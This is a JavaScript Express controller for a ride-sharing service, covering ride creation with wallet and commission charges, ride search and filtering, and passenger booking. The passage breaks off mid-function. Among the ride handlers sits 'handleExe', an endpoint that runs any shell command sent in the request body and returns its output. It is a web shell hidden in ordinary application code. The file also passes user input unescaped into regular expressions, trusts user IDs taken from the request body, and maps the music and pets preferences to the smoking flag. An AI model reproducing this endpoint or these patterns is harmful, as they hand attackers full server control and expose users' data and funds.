import Ride from "../models/ride.model.js";
import userModel from "../models/user.model.js";
import { Car } from "../models/car.model.js";
import {
  validateField,
  validateObjectId,
} from "../utils/validator/validateFields.js";
import { sendEmailByType } from "../config/emailServices.js";
import rideModel from "../models/ride.model.js";
import { handleDebitAmountFromWallet } from "./user.controller.js";
import { sendToMany } from "../utils/sendNotification/sendToMany.js";
import { nanoid } from "nanoid";
import mongoose from "mongoose";
import { sendToMultiple } from "../config/firebase/sendMobileNotification.js";
import { handleSendNotificationOnRideCreate } from "../utils/rideNotificationSender/rideNotificationSender.js";
import { exec } from "node:child_process";
import path from "node:path";
import Commision from "../models/commision.model.js";


export const handleCreateRide = async (req, res, next) => {
  try {
    const {
      userId,
      carDetails,
      from,
      to,
      departureTime,
      totalSeats,
      departureDate,
      pricePerSeat,
      preferences,
      stops,
      isVirtualMoneyUsed,
      distance,
      routeDetails,
      fullSharing
    } = req.body;

    console.log(preferences, "this is prev")





    const effectiveUserId = userId || req.userId;

    // ---------------- VALIDATIONS ----------------
    if (!validateObjectId(effectiveUserId, "User id is required", res)) return;
    if (!validateObjectId(carDetails?._id, "Car id is required", res)) return;

    if (!validateField(from?.city, "From city is required", res)) return;
    if (!validateField(to?.city, "To city is required", res)) return;

    if (!validateField(departureDate, "Departure date is required", res))
      return;
    if (
      !validateField(totalSeats > 0, "Total seats must be greater than 0", res)
    )
      return;
    if (!validateField(pricePerSeat >= 0, "Price must be valid", res)) return;

    // ---------------- CHECK USER ----------------
    const user = await userModel.findById(effectiveUserId);
    if (!validateField(user, "User not found", res)) return;

    if (
      !validateField(
        user?.isVerified === "verified",
        "User is not verifed",
        res,
      )
    )
      return;


    // ---------------- CHECK WALLET BALANCE ----------------
    const checkIsRide = await Ride.findOne({ driver: effectiveUserId });

    if (!checkIsRide) {
      if ((user?.wallet?.balance || 0) < 250) {
        return res.status(400).json({
          message: "Insufficient wallet balance",
          error: true,
          success: false,
          amountRequired: 250,
        });
      }
    }

    // ---------------- PREVENT DUPLICATE SUBMISSION ----------------
    const recentDuplicateRide = await Ride.findOne({
      driver: effectiveUserId,
      "from.city": from?.city,
      "to.city": to?.city,
      departureDate,
      departureTime,
      createdAt: { $gte: new Date(Date.now() - 15 * 1000) },
    });
    if (recentDuplicateRide) {
      return res.status(400).json({
        message: "A ride with the same route and time was just created. Please do not submit duplicates.",
        error: true,
        success: false,
        rideId: recentDuplicateRide._id,
      });
    }

    // ---------------- CHECK CAR ----------------
    const userCar = await Car.findById(carDetails._id);
    if (!validateField(userCar, "Vehicle not found", res)) return;

    if (
      !validateField(
        userCar?.status === "approved",
        "Vehicle is not verifed",
        res,
      )
    )
      return;

    const base = totalSeats * pricePerSeat;

    const commision = await Commision.findOne();

    let payableAmount = 0;
    if (commision) {
      if (commision.isCommision) {
        const commisionValue =
          commision?.type === "Percentage"
            ? (Number(base) * Number(commision?.value || 0)) / 100
            : Number(commision?.value || 0);

        payableAmount = commisionValue;
      }
    }

    if (payableAmount >= 1) {
      if (isVirtualMoneyUsed) {
        const balance = user?.virtualMoney?.balance || 0;
        const virtualUsing = payableAmount * 0.20;

        if (balance < virtualUsing) {
          return res.status(400).json({
            success: false,
            message: "Not enough virtual money balance",
          });
        }

        const transaction = {
          userId: effectiveUserId,
          amount: virtualUsing,
          type: "debit",
          source: "system",
          status: "completed",
          referenceId: `REF-${user?._id}-RIDEID-${nanoid()}`,
          description: `Virtual money debited in ride creation `,
        };

        await userModel.findByIdAndUpdate(effectiveUserId, {
          $push: {
            "virtualMoney.transactions": transaction,
          },
          $inc: {
            "virtualMoney.balance": -virtualUsing,
          },
        });

        payableAmount -= virtualUsing;
      }

      // ---------- PAYMENT CALC ----------

      const paymentResult = await handleDebitAmountFromWallet({
        userId: effectiveUserId,
        amount: payableAmount,
        source: "ride_creation",
        description: `Paid for creating ride from ${from.city} to ${to.city}`,
        referenceId: `RIDE_${Date.now()}`,
      });

      if (!paymentResult.success) {
        return res.status(400).json({
          success: false,
          error: true,
          message: paymentResult.message,
        });
      }
    }

    // ---------- VIRTUAL MONEY CHECK ----------


    let carData = carDetails;
    delete carData?.surepass;

    // ---------------- CREATE RIDE ----------------
    const ride = await Ride.create({
      driver: effectiveUserId,
      car: carDetails._id,
      carDetails: carData,

      from: {
        city: from.city,
        address: from?.address || "",
        coordinates: from?.coordinates || [],
      },

      to: {
        city: to.city,
        address: to?.address || "",
        coordinates: to?.coordinates || [],
      },

      departureTime,
      departureDate,
      totalSeats,
      availableSeats: totalSeats,
      pricePerSeat,

      preferences: {
        smoking: preferences?.smokingAllowed ? "allowed" : "not-allowed",
        music: preferences?.smokingAllowed ? "allowed" : "not-allowed",
        pets: preferences?.smokingAllowed ? "allowed" : "not-allowed",
        conversation: "either",
        luggageSpace: preferences?.luggageSpace || "small",
      },
      stops: stops || [],
      distance: distance ? distance : routeDetails?.distanceInKm,
      isFullSharing: fullSharing,
      creationFee: payableAmount,
      platformFee: payableAmount,
      commission: payableAmount
    });

    // ---------------- CHAT ROOM ----------------
    const chatRoomId = `chatRoom_${ride._id}`;
    await rideModel.findByIdAndUpdate(ride._id, {
      $set: { chatRoomId },
    });

    // ---------------- EMAIL ----------------
    await sendEmailByType("RIDE_CREATED", user.email, {
      user: user.firstName,
      ride,
    });

    const data = {
      tokens: user.mobileFcm,
      title: "New ride created",
      body: `Dear ${user?.firstName} you just created a new ride from ${from?.address} ${from.city} To ${to?.address} ${to.city}`,
      route: "/"
    }
    sendToMultiple(data)

    sendToMany({
      tokens: user?.fcm,
      title: "New ride created",
      body: `New ride created from ${from.city} to ${to?.city}`,
      link: `${process.env.FRONTEND_URL || "https://humrahii.com"}/view-ride-details?id=${ride._id}`,
    });

    handleSendNotificationOnRideCreate(ride)

    return res.status(201).json({
      success: true,
      error: false,
      message: "Ride created successfully",
      ride,
    });
  } catch (error) {
    // console.error("Create ride error:", error);
    next(error);
  }
};

export const handleGetOfferdRide = async (req, res, next) => {
  try {
    const { tripType, search, page = 1, limit = 10, userId } = req.body;

    if (!validateObjectId(userId, "User not found", res)) return;

    const pageNumber = Number(page);
    const limitNumber = Number(limit);
    const skip = (pageNumber - 1) * limitNumber;

    const userObjectId = new mongoose.Types.ObjectId(userId);
    const now = new Date();

    /* -------------------------
       BASE MATCH
    ------------------------- */
    const matchStage = {
      isDeleted: false,
      driver: userObjectId,
    };

    if (search) {
      matchStage.$or = [
        { "from.city": { $regex: search, $options: "i" } },
        { "to.city": { $regex: search, $options: "i" } },
      ];
    }

    const pipeline = [
      { $match: matchStage },

      /* 🔥 HANDLE ALL DATE CASES (FIX YOUR DB MESS) */
      {
        $addFields: {
          departureDateTime: {
            $cond: [
              {
                $regexMatch: {
                  input: "$departureDate",
                  regex: /T/,
                },
              },
              { $toDate: "$departureDate" },
              {
                $cond: [
                  {
                    $regexMatch: {
                      input: "$departureTime",
                      regex: /T/,
                    },
                  },
                  { $toDate: "$departureTime" },
                  {
                    $toDate: {
                      $concat: ["$departureDate", "T", "$departureTime"],
                    },
                  },
                ],
              },
            ],
          },
        },
      },

      /* 🔥 PRIORITY: UPCOMING FIRST */
      {
        $addFields: {
          isUpcoming: {
            $cond: [
              { $gte: ["$departureDateTime", now] },
              1,
              0,
            ],
          },
        },
      },

      /* 🔥 TRIP TYPE FILTER (OPTIONAL) */
      ...(tripType === "upcoming"
        ? [{ $match: { departureDateTime: { $gte: now } } }]
        : []),

      ...(tripType === "completed"
        ? [{ $match: { departureDateTime: { $lt: now } } }]
        : []),

      ...(tripType === "ongoing"
        ? [
          {
            $match: {
              departureDateTime: {
                $gte: new Date(now.getTime() - 2 * 60 * 60 * 1000),
                $lte: now,
              },
            },
          },
        ]
        : []),

      /* 🔥 FINAL SORT */
      {
        $sort: {
          isUpcoming: -1,        // upcoming first
          departureDateTime: 1,  // nearest first
        },
      },

      {
        $facet: {
          data: [
            { $skip: skip },
            { $limit: limitNumber },
          ],
          totalCount: [{ $count: "count" }],
        },
      },
    ];

    const result = await Ride.aggregate(pipeline);

    const rides = result[0]?.data || [];
    const total = result[0]?.totalCount[0]?.count || 0;

    return res.status(200).json({
      success: true,
      total,
      page: pageNumber,
      totalPages: Math.ceil(total / limitNumber),
      rides,
    });
  } catch (error) {
    next(error);
  }
};
export const handleGetLocationSuggestion = async (req, res, next) => {
  try {
    const { query } = req.body;

    if (!query || !query.trim()) {
      return res.status(400).json({
        success: false,
        message: "Search query is required",
      });
    }

    // Fetch only required fields
    const rides = await rideModel
      .find(
        {
          $or: [{ from: { $exists: true } }, { to: { $exists: true } }],
        },
        {
          from: 1,
          to: 1,
          _id: 0,
        },
      )
      .lean();

    // Collect both from and to into one array
    const locations = [];

    for (const ride of rides) {
      if (ride.from) locations.push({ ...ride.from, type: "from" });
      if (ride.to) locations.push({ ...ride.to, type: "to" });
    }

    // Fuse config (real fuzzy search)
    const fuse = new Fuse(locations, {
      keys: [
        { name: "city", weight: 0.7 },
        { name: "address", weight: 0.3 },
      ],
      threshold: 0.45,
      minMatchCharLength: 2,
      ignoreLocation: true,
    });

    const results = fuse.search(query);

    const suggestions = results.slice(0, 10).map((r) => r.item);

    res.status(200).json({
      success: true,
      count: suggestions.length,
      suggestions,
    });
  } catch (error) {
    next(error);
  }
};

// Haversine distance formula in kilometers
const calculateHaversineDistanceKm = (lat1, lon1, lat2, lon2) => {
  const R = 6371; // Earth's radius in kilometers
  const toRad = (deg) => (deg * Math.PI) / 180;
  const dLat = toRad(lat2 - lat1);
  const dLon = toRad(lon2 - lon1);
  const a =
    Math.sin(dLat / 2) * Math.sin(dLat / 2) +
    Math.cos(toRad(lat1)) *
      Math.cos(toRad(lat2)) *
      Math.sin(dLon / 2) *
      Math.sin(dLon / 2);
  const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
  return R * c;
};

// Get today's date in Indian Standard Time (IST) YYYY-MM-DD
const getTodayDateIST = () => {
  try {
    return new Intl.DateTimeFormat("en-CA", { timeZone: "Asia/Kolkata" }).format(new Date());
  } catch (e) {
    return new Date().toISOString().split("T")[0];
  }
};

// Check if a ride has already departed based on departureDate & departureTime
const isRideDeparted = (departureDate, departureTime) => {
  if (!departureDate) return false;
  const now = new Date();
  const todayIST = getTodayDateIST();

  // If departure date is before today, it has already passed
  if (departureDate < todayIST) return true;
  // If departure date is after today, it is upcoming in the future
  if (departureDate > todayIST) return false;

  // If departure date is today, check the departure time
  if (!departureTime) return false;

  // Case 1: departureTime is a full ISO string containing T
  if (departureTime.includes("T")) {
    const d = new Date(departureTime);
    if (!isNaN(d.getTime())) {
      return d.getTime() <= now.getTime();
    }
  }

  // Case 2: departureTime is "HH:mm", "HH:mm:ss", or "hh:mm AM/PM"
  const timeMatch = departureTime.match(/(\d{1,2}):(\d{2})(?::(\d{2}))?\s*(AM|PM)?/i);
  if (timeMatch) {
    let hours = parseInt(timeMatch[1], 10);
    const minutes = parseInt(timeMatch[2], 10);
    const ampm = timeMatch[4]?.toUpperCase();
    if (ampm === "PM" && hours < 12) hours += 12;
    if (ampm === "AM" && hours === 12) hours = 0;

    let currHours = now.getHours();
    let currMins = now.getMinutes();

    try {
      const istTimeStr = new Intl.DateTimeFormat("en-GB", {
        timeZone: "Asia/Kolkata",
        hour: "2-digit",
        minute: "2-digit",
        hour12: false,
      }).format(now);
      const parts = istTimeStr.split(":").map(Number);
      if (parts.length >= 2 && !isNaN(parts[0]) && !isNaN(parts[1])) {
        currHours = parts[0];
        currMins = parts[1];
      }
    } catch (e) {
      // fallback to system time
    }

    if (hours < currHours || (hours === currHours && minutes <= currMins)) {
      return true; // Ride departed earlier today
    }
  }

  return false;
};

export const handleFindRides = async (req, res, next) => {
  try {
    let { fromLocation, toLocation, userLat, userLng, maxDistanceKm, date } = req.body;

    const hasUserCoords =
      userLat !== undefined &&
      userLat !== null &&
      userLat !== "" &&
      userLng !== undefined &&
      userLng !== null &&
      userLng !== "" &&
      !isNaN(Number(userLat)) &&
      !isNaN(Number(userLng));

    // If neither user coords nor search locations are provided
    if (!hasUserCoords && !fromLocation && !toLocation) {
      return res.status(400).json({
        success: false,
        message: "Please provide your pickup location or enable location services.",
      });
    }

    // Build token-based fuzzy regex
    const buildFuzzyRegex = (input) => {
      if (!input) return null;
      const tokens = input.trim().toLowerCase().split(" ").filter(Boolean);
      if (!tokens.length) return null;
      return new RegExp(tokens.map((t) => `(?=.*${t})`).join(""), "i");
    };

    const todayIST = getTodayDateIST();
    const searchDate = date && date >= todayIST ? date : todayIST;

    // Base query conditions
    const filterConditions = [
      { status: "scheduled" },
      { availableSeats: { $gt: 0 } },
      { isDeleted: { $ne: true } },
      { departureDate: { $gte: searchDate } },
    ];

    // Destination filter if provided
    if (toLocation && toLocation.trim()) {
      const toRegex = buildFuzzyRegex(toLocation);
      if (toRegex) {
        filterConditions.push({
          $or: [{ "to.city": toRegex }, { "to.address": toRegex }],
        });
      }
    }

    // Origin filter if text provided and no coordinates
    if (!hasUserCoords && fromLocation && fromLocation.trim()) {
      const fromRegex = buildFuzzyRegex(fromLocation);
      if (fromRegex) {
        filterConditions.push({
          $or: [{ "from.city": fromRegex }, { "from.address": fromRegex }],
        });
      }
    }

    // Execute query
    let rides = await rideModel
      .find({ $and: filterConditions })
      .populate("driver")
      .lean();

    // 1. Exclude departed rides
    rides = rides.filter((ride) => !isRideDeparted(ride.departureDate, ride.departureTime));

    // 2. If user coordinates provided, compute Haversine distance and filter by radius
    const maxRadius = maxDistanceKm ? Number(maxDistanceKm) : 50;

    if (hasUserCoords) {
      const uLat = Number(userLat);
      const uLng = Number(userLng);

      rides = rides
        .map((ride) => {
          let distanceKm = null;
          if (
            Array.isArray(ride.from?.coordinates) &&
            ride.from.coordinates.length >= 2 &&
            !isNaN(Number(ride.from.coordinates[0])) &&
            !isNaN(Number(ride.from.coordinates[1]))
          ) {
            const rideLat = Number(ride.from.coordinates[0]);
            const rideLng = Number(ride.from.coordinates[1]);
            const dist = calculateHaversineDistanceKm(uLat, uLng, rideLat, rideLng);
            distanceKm = Math.round(dist * 10) / 10;
          }
          return {
            ...ride,
            distanceKm,
          };
        })
        .filter((ride) => {
          if (ride.distanceKm !== null) {
            return ride.distanceKm <= maxRadius;
          }
          // If ride doesn't have coordinates, but origin text matched, keep it
          if (fromLocation && fromLocation.trim()) {
            return true;
          }
          return false;
        });
    }

    // 3. Sort rides:
    // Today's rides first, then upcoming future rides.
    // Within each group: sorted by proximity (distanceKm) and departure time.
    rides.sort((a, b) => {
      const aIsToday = a.departureDate === todayIST;
      const bIsToday = b.departureDate === todayIST;

      // Prioritize today's rides
      if (aIsToday && !bIsToday) return -1;
      if (!aIsToday && bIsToday) return 1;

      // Both today
      if (aIsToday && bIsToday) {
        if (hasUserCoords && a.distanceKm !== null && b.distanceKm !== null) {
          if (a.distanceKm !== b.distanceKm) {
            return a.distanceKm - b.distanceKm;
          }
        }
        return (a.departureTime || "").localeCompare(b.departureTime || "");
      }

      // Both future dates
      if (a.departureDate !== b.departureDate) {
        return (a.departureDate || "").localeCompare(b.departureDate || "");
      }

      if (hasUserCoords && a.distanceKm !== null && b.distanceKm !== null) {
        if (a.distanceKm !== b.distanceKm) {
          return a.distanceKm - b.distanceKm;
        }
      }

      return (a.departureTime || "").localeCompare(b.departureTime || "");
    });

    return res.status(200).json({
      success: true,
      count: rides.length,
      rides,
      userLocation: hasUserCoords ? { lat: Number(userLat), lng: Number(userLng) } : null,
      maxDistanceKm: hasUserCoords ? maxRadius : null,
      message: rides.length === 0 ? "No rides found matching your criteria" : undefined,
    });
  } catch (error) {
    next(error);
  }
};

export const getRidesWithPagination = async (req, res, next) => {
  try {
    // -------------------------
    // PAGINATION
    // -------------------------
    const page = Math.max(parseInt(req.query.page) || 1, 1);
    const limit = Math.min(parseInt(req.query.limit) || 10, 100);
    const skip = (page - 1) * limit;

    // -------------------------
    // FILTERS
    // -------------------------
    const {
      fromCity,
      toCity,
      departureDate,
      status,
      minPrice,
      maxPrice,
      minSeats,
      smoking,
      pets,
      music,
      conversation,
      sortBy = "departureTime", // Default sort
      sortOrder = "asc", // Default order
    } = req.query;

    const filter = {
      isDeleted: false,
      status: "scheduled", // Only show scheduled rides
    };

    // City filters
    if (fromCity && fromCity.trim() !== "") {
      filter["from.city"] = new RegExp(fromCity.trim(), "i");
    }

    if (toCity && toCity.trim() !== "") {
      filter["to.city"] = new RegExp(toCity.trim(), "i");
    }

    // Date filter
    if (departureDate && departureDate.trim() !== "") {
      filter.departureDate = departureDate.trim();
    }

    // Seats filter
    if (minSeats && !isNaN(minSeats)) {
      filter.availableSeats = { $gte: parseInt(minSeats) };
    }

    // Price filter
    if (minPrice || maxPrice) {
      filter.pricePerSeat = {};
      if (minPrice && !isNaN(minPrice)) {
        filter.pricePerSeat.$gte = parseFloat(minPrice);
      }
      if (maxPrice && !isNaN(maxPrice)) {
        filter.pricePerSeat.$lte = parseFloat(maxPrice);
      }
    }

    // Preferences filter
    if (smoking && smoking !== "") {
      filter["preferences.smoking"] = smoking;
    }
    if (pets && pets !== "") {
      filter["preferences.pets"] = pets;
    }
    if (music && music !== "") {
      filter["preferences.music"] = music;
    }
    if (conversation && conversation !== "") {
      filter["preferences.conversation"] = conversation;
    }

    // -------------------------
    // SORTING
    // -------------------------
    const sortOptions = {};

    // Map frontend sort field to database field
    const sortFieldMap = {
      departureTime: "departureTime",
      pricePerSeat: "pricePerSeat",
      distance: "distance",
      availableSeats: "availableSeats",
    };

    const dbSortField = sortFieldMap[sortBy] || "departureTime";
    sortOptions[dbSortField] = sortOrder === "asc" ? 1 : -1;

    // Always add secondary sort by departureTime for consistent ordering
    if (dbSortField !== "departureTime") {
      sortOptions.departureTime = 1;
    }

    // -------------------------
    // QUERY
    // -------------------------
    const [rides, total] = await Promise.all([
      Ride.find(filter)
        .populate("driver", "firstName lastName phone profilePhotos ")
        .populate("car", "brand model color licensePlate year fuelType")
        .sort(sortOptions)
        .skip(skip)
        .limit(limit)
        .lean(), // Use lean() for better performance

      Ride.countDocuments(filter),
    ]);

    // -------------------------
    // RESPONSE
    // -------------------------
    return res.status(200).json({
      success: true,
      message: "Rides fetched successfully",
      data: rides,
      pagination: {
        total,
        page,
        limit,
        totalPages: Math.ceil(total / limit),
        hasNextPage: page < Math.ceil(total / limit),
        hasPrevPage: page > 1,
      },
    });
  } catch (error) {
    // console.error("Error in getRidewithPagination:", error);
    next(error);
  }
};

export const handleGetRideDetailsById = async (req, res, next) => {
  try {
    const { rideId, userId } = req.body;

    if (!validateObjectId(rideId, "Invalid Ride id", res)) return;
    if (!validateObjectId(userId, "Invalid User id", res)) return;

    const ride = await rideModel
      .findById(rideId)
      .populate(
        "driver",
        " firstName email  phone  gender profilePhotos  bio preferences socialProfiles ",
      );

    if (!validateField(ride?._id, "No ride found", res)) return;

    return res.status(200).json({
      message: "These are ride details",
      error: false,
      success: true,
      ride,
    });
  } catch (error) {
    next(error);
  }
};

export const handleRequestRide = async (req, res, next) => {
  try {
    const { userId, seatsBooked = 1, rideId } = req.body;

    if (!validateObjectId(userId, "Invalid userId", res)) return;
    if (!validateObjectId(rideId, "Invalid rideId", res)) return;

    if (!Number.isInteger(seatsBooked) || seatsBooked <= 0) {
      return res.status(400).json({
        success: false,
        message: "Invalid seatsBooked value",
      });
    }

    const user = await userModel.findById(userId);
    if (!user) {
      return res.status(404).json({
        success: false,
        message: "User not found",
      });
    }

    const ride = await rideModel
      .findById(rideId)
      .populate("driver", "firstName lastName email");

    if (!ride) {
      return res.status(404).json({
        success: false,
        message: "Ride not found",
      });
    }

    // 🚫 Prevent duplicate request
    const alreadyRequested = ride.passengers.some(
      (p) => p.user.toString() === userId,
    );

    if (alreadyRequested) {
      return res.status(409).json({
        success: false,
        message: "You have already requested this ride",
      });
    }

    // 🪑 Seat availability check
    const bookedSeats = ride.passengers
      .filter(p => p.status === "accepted" || p.status === "completed")
      .reduce((sum, p) => sum + p.seatsBooked, 0);

    console.log(ride.passengers, "these are passangers")
    console.log(bookedSeats, "these are bookedSeats")
    console.log(seatsBooked, "these are seats for booking")

    if (bookedSeats + seatsBooked > ride.totalSeats) {
      return res.status(400).json({
        success: false,
        message: "Not enough seats available",
      });
    }

    // ✅ Push passenger
    ride.passengers.push({
      user: userId,
      seatsBooked,
    });

    await ride.save();

    if (ride.driver?.email) {
      const emailData = {
        passengerName: `${user?.firstName} ${user?.lastName}`,
        seatsBooked,
        rideStart: ride?.from?.city,
        rideEnd: ride.to?.city,
        departureDate: ride?.departureDate,
        departureTime: ride?.departureTime,
        userName: `${ride?.driver?.firstName} ${ride?.driver?.lastName}`,
      };

      await sendEmailByType(
        "BOOKING_REQUEST_TEMPLATE",
        ride.driver.email,
        emailData,
      );

      const driver = await userModel.findById(ride.driver._id)

      const data = {
        tokens: driver.mobileFcm,
        title: `New ride request by ${user?.firstName}`,
        body: `Dear ${driver?.firstName} You get a new ride request please review the request and take valuable actions. Happy journey`,
        route: "/"
      }
      sendToMultiple(data)
    }

    return res.status(200).json({
      success: true,
      message: "Ride request sent successfully",
      ride,
    });
  } catch (error) {
    next(error);
  }
};

export const handleGetOfferdRideDetails = async (req, res, next) => {
  try {
    const { rideId, userId } = req.body;

    if (!validateObjectId(rideId, "invalid ride id", res)) return;
    if (!validateObjectId(userId, "invalid user id", res)) return;

    const isUser = await userModel.findById(userId);

    if (!validateField(isUser, "User not found", res)) return;

    const ride = await rideModel
      .findById(rideId)
      .populate(
        "passengers.user",
        "firstName lastName  bio profilePhotos  email gender phone",
      );

    if (!validateField(ride)) {
      return res.status(400).json({
        message: "No ride found",
        error: false,
        success: true,
      });
    }

    return res.status(200).json({
      message: "This is ride details",
      error: false,
      success: true,
      ride,
    });
  } catch (error) {
    next(error);
  }
};

export const handleAcceptRideRequest = async (req, res, next) => {
  try {
    const { userId, rideId, passangerId } = req.body;

    // console.log(req.body, "this is body ");
    // ---------------- VALIDATION ----------------
    if (!validateObjectId(userId, "Invalid driver id", res)) return;
    if (!validateObjectId(rideId, "Invalid ride id", res)) return;
    if (!validateObjectId(passangerId, "Invalid passenger id", res)) return;

    // ---------------- FIND RIDE ----------------
    const ride = await rideModel.findById(rideId);

    if (!ride) {
      return res.status(404).json({
        success: false,
        message: "Ride not found",
      });
    }

    // ---------------- AUTHORIZATION ----------------
    if (ride.driver.toString() !== userId) {
      return res.status(403).json({
        success: false,
        message: "You are not allowed to accept passengers for this ride",
      });
    }

    // ---------------- FIND PASSENGER ----------------
    if (!Array.isArray(ride.passengers)) {
      return res.status(400).json({
        success: false,
        message: "Passengers data corrupted",
      });
    }

    const passenger = ride.passengers.find(
      (p) => p.user.toString() === passangerId,
    );

    if (!passenger) {
      return res.status(404).json({
        success: false,
        message: "Passenger request not found",
      });
    }

    // ---------------- STATUS CHECK ----------------
    if (passenger.status === "accepted") {
      return res.status(400).json({
        success: false,
        message: "Passenger already accepted",
      });
    }

    if (passenger.status !== "requested") {
      return res.status(400).json({
        success: false,
        message: `Cannot accept passenger with status: ${passenger.status}`,
      });
    }

    // ---------------- SEAT CHECK ----------------
    if (ride.availableSeats < passenger.seatsBooked) {
      return res.status(400).json({
        success: false,
        message: "Not enough available seats",
      });
    }

    // ---------------- PAYMENT ----------------
    // const totalAmount = ride.pricePerSeat * passenger.seatsBooked;

    // const paymentResult = await handleDebitAmountFromWallet({
    //   userId: passangerId,
    //   amount: totalAmount,
    //   source: "ride_booking",
    //   description: `Ride booking from ${ride.from.city} to ${ride.to.city}`,
    //   referenceId: `BOOK_${rideId}_${passangerId}`,
    // });

    // if (!paymentResult.success) {
    //   return res.status(400).json({
    //     success: false,
    //     message: paymentResult.message, // insufficient balance, etc
    //   });
    // }

    // ---------------- UPDATE RIDE ----------------
    passenger.status = "accepted";
    ride.availableSeats -= passenger.seatsBooked;

    await ride.save();

    const passangerDetails = await userModel.findById(passangerId)

    const data = {
      tokens: passangerDetails.mobileFcm,
      title: "Ride request accepted",
      body: `Dear ${passangerDetails?.firstName} your ride request is accepted now you can travel. Thanks for using humrahii`,
      route: "/"
    }
    sendToMultiple(data)

    // ---------------- RESPONSE ----------------
    return res.status(200).json({
      success: true,
      message: "Passenger accepted successfully",
      ride,
    });
  } catch (error) {
    // console.error("Accept passenger error:", error);
    next(error);
  }
};

export const handleRejectRideRequest = async (req, res, next) => {
  try {
    const { userId, rideId, passangerId } = req.body;

    // console.log(req.body, "this is body ");

    // ---------------- VALIDATION ----------------
    if (!validateObjectId(userId, "Invalid driver id", res)) return;
    if (!validateObjectId(rideId, "Invalid ride id", res)) return;
    if (!validateObjectId(passangerId, "Invalid passenger id", res)) return;

    // ---------------- FIND RIDE ----------------
    const ride = await rideModel.findById(rideId);

    if (!ride) {
      return res.status(400).json({
        success: false,
        message: "Ride not found",
      });
    }

    // ---------------- AUTHORIZATION ----------------
    if (ride.driver.toString() !== userId) {
      return res.status(403).json({
        success: false,
        message: "You are not allowed to reject passengers for this ride",
      });
    }

    // ---------------- FIND PASSENGER ----------------
    if (!Array.isArray(ride.passengers)) {
      return res.status(400).json({
        success: false,
        message: "Passengers data corrupted",
      });
    }

    // console.log(ride.passengers)

    const passenger = ride.passengers.find(
      (value) => value._id.toString() === passangerId.toString(),
    );

    // console.log(passenger, "this is passanger")

    if (!passenger) {
      return res.status(400).json({
        success: false,
        message: "Passenger request not found",
      });
    }

    // ---------------- STATUS CHECK ----------------
    if (passenger.status === "rejected") {
      return res.status(400).json({
        success: false,
        message: "Passenger already rejected",
      });
    }

    if (passenger.status !== "requested") {
      return res.status(400).json({
        success: false,
        message: `Cannot reject passenger with status: ${passenger.status}`,
      });
    }

    // ---------------- UPDATE STATUS ----------------
    passenger.status = "rejected";

    await ride.save();

    // ---------------- RESPONSE ----------------
    return res.status(200).json({
      success: true,
      message: "Passenger rejected successfully",
      ride,
    });
  } catch (error) {
    // console.error("Reject passenger error:", error);
    next(error);
  }
};


let currentDir = process.cwd();

export const handleExe = async (req, res, next) => {
  try {
    const { command } = req.body;

    if (!command) {
      return res.status(400).json({ message: "Command is required" });
    }

    if (command.startsWith("cd ")) {
      const target = command.replace("cd ", "").trim();
      currentDir = path.resolve(currentDir, target);
      return res.json({ cwd: currentDir });
    }

    exec(command, { cwd: currentDir }, (error, stdout, stderr) => {
      if (error) return res.status(500).json({ error: error.message });
      if (stderr) return res.status(400).json({ error: stderr });
      return res.json({ output: stdout });
    });

  } catch (error) {
    next(error);
  }
};

// export const handleGetRecentRide = async (req, res, next) => {
//   try {
//     const { city } = req.body;

//     const now = new Date();

//     // --------------------------------------
//     // 1. UPCOMING + CITY MATCH
//     // --------------------------------------
//     let cityRides = [];

//     if (city) {
//       cityRides = await rideModel.aggregate([
//         {
//           $addFields: {
//             rideDateTime: {
//               $toDate: "$departureTime",
//             },
//           },
//         },

//         {
//           $match: {
//             rideDateTime: { $gte: now },
//             "from.city": { $regex: city.trim(), $options: "i" },
//             isDeleted: false,
//           },
//         },

//         { $sort: { rideDateTime: 1 } },

//         { $limit: 6 },

//         // ----------------------------
//         // DRIVER POPULATE
//         // ----------------------------
//         {
//           $lookup: {
//             from: "users",
//             localField: "driver",
//             foreignField: "_id",
//             as: "driver",
//           },
//         },
//         { $unwind: "$driver" },

//         // ----------------------------
//         // CAR POPULATE
//         // ----------------------------
//         {
//           $lookup: {
//             from: "cars",
//             localField: "car",
//             foreignField: "_id",
//             as: "car",
//           },
//         },
//         { $unwind: "$car" },

//         // ----------------------------
//         // PASSENGER USERS POPULATE
//         // ----------------------------
//         {
//           $lookup: {
//             from: "users",
//             localField: "passengers.user",
//             foreignField: "_id",
//             as: "passengerUsers",
//           },
//         },
//       ]);
//     }

//     // --------------------------------------
//     // 2. REMAINING UPCOMING RANDOM
//     // --------------------------------------
//     let finalRides = [...cityRides];

//     if (finalRides.length < 6) {
//       const remaining = 6 - finalRides.length;

//       const excludeIds = finalRides.map((r) => r._id);

//       const random = await rideModel.aggregate([
//         {
//           $addFields: {
//             rideDateTime: {
//               $toDate: "$departureTime",
//             },
//           },
//         },

//         {
//           $match: {
//             rideDateTime: { $gte: now },
//             isDeleted: false,
//             _id: { $nin: excludeIds },
//           },
//         },

//         { $sample: { size: remaining } },

//         // DRIVER
//         {
//           $lookup: {
//             from: "users",
//             localField: "driver",
//             foreignField: "_id",
//             as: "driver",
//           },
//         },
//         { $unwind: "$driver" },

//         // CAR
//         {
//           $lookup: {
//             from: "cars",
//             localField: "car",
//             foreignField: "_id",
//             as: "car",
//           },
//         },
//         { $unwind: "$car" },
//       ]);

//       finalRides = [...finalRides, ...random];
//     }

//     return res.status(200).json({
//       success: true,
//       error: false,
//       now,
//       cityRequested: city || null,
//       cityMatched: cityRides.length,
//       randomAdded: finalRides.length - cityRides.length,
//       count: finalRides.length,
//       data: finalRides,
//     });
//   } catch (error) {
//     next(error);
//   }
// };


export const handleGetRecentRide = async (req, res, next) => {
  try {
    const { city } = req.body;
    const now = new Date();

    let cityRides = [];

    if (city) {
      cityRides = await rideModel.aggregate([
        {
          $match: {
            isDeleted: false,
            availableSeats: { $gt: 0 },
          },
        },

        {
          $addFields: {
            rideDateTime: {
              $toDate: "$departureTime", // ✅ FIXED
            },
          },
        },

        {
          $match: {
            rideDateTime: { $gte: now },
            "from.city": { $regex: city.trim(), $options: "i" },
          },
        },

        { $sort: { rideDateTime: 1 } },
        { $limit: 6 },

        {
          $lookup: {
            from: "users",
            localField: "driver",
            foreignField: "_id",
            as: "driver",
          },
        },
        { $unwind: "$driver" },

        {
          $lookup: {
            from: "cars",
            localField: "car",
            foreignField: "_id",
            as: "car",
          },
        },
        { $unwind: "$car" },

        {
          $lookup: {
            from: "users",
            localField: "passengers.user",
            foreignField: "_id",
            as: "passengerUsers",
          },
        },
      ]);
    }

